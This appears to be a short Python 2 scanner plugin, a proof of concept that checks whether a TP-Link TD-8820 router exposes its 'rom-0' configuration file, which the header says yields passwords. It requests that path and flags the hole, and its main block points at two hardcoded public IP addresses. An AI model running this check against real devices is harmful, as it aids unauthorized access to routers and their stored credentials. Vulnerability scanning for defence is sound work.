#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urlparse
import time
import re

"""
POC Name  :  TP-link TD-8820 配置文件下载 可获得密码
Author    :  a
mail      :  a@lcx.cc
Referer   :  http://www.wooyun.org/bugs/wooyun-2014-075723/
"""

def assign(service, arg):
    if service == 'tp-link':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    p = 'rom-0'
    url = arg + p
    code, head,res, errcode, _ = curl.curl2(url)
    if code ==200 and 'application/octet-stream' in head and 'UPnP' in head and 'ether driver etherppp' in res:
        security_hole(url + '    config file can be download')


if __name__ == '__main__':
    from dummy import *
    #audit(assign('www', 'http://113.246.89.162/')[1])
    audit(assign('tp-link', 'http://222.240.72.157/')[1])